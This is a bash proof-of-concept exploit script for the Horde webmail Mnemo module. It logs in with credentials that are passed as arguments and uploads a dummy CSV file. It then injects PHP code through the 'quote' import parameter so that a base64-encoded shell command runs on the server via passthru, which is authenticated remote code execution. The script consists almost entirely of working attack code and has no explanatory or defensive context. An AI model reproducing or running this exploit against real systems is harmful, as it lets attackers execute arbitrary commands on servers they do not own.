
if [ "$#" -ne 4 ]; then
    echo &#039;[!] Usage: <url> <username> <password> <command>&#039; 1>&2
    exit 1
fi

BASE="$1"
USERNAME="$2"
PASSWORD="$3"
COMMAND="$4"

JAR="$(mktemp)"
trap &#039;rm -f "$JAR"&#039; EXIT

echo "[+] Logging in as $USERNAME:$PASSWORD" 1>&2
curl -si -c "$JAR" "$BASE/login.php" \
    -d &#039;login_post=1&#039; \
    -d "horde_user=$USERNAME" \
    -d "horde_pass=$PASSWORD" | grep -q &#039;Location: /services/portal/&#039; || \
    echo &#039;[!] Cannot log in&#039; 1>&2

echo "[+] Uploading dummy file" 1>&2
echo x | curl -si -b "$JAR" "$BASE/mnemo/data.php" \
    -F &#039;actionID=11&#039; \
    -F &#039;import_step=1&#039; \
    -F &#039;import_format=csv&#039; \
    -F &#039;notepad_target=x&#039; \
    -F &#039;import_file=@-;filename=x&#039; \
    -so /dev/null

echo "[+] Running command" 1>&2
BASE64_COMMAND="$(echo -n "$COMMAND 2>&1" | base64 -w0)"
curl -b "$JAR" "$BASE/mnemo/data.php" \
    -d &#039;actionID=3&#039; \
    -d &#039;import_step=2&#039; \
    -d &#039;import_format=csv&#039; \
    -d &#039;header=1&#039; \
    -d &#039;fields=1&#039; \
    -d &#039;sep=x&#039; \
    --data-urlencode "quote=).passthru(base64_decode(\"$BASE64_COMMAND\")).die();}//\\"

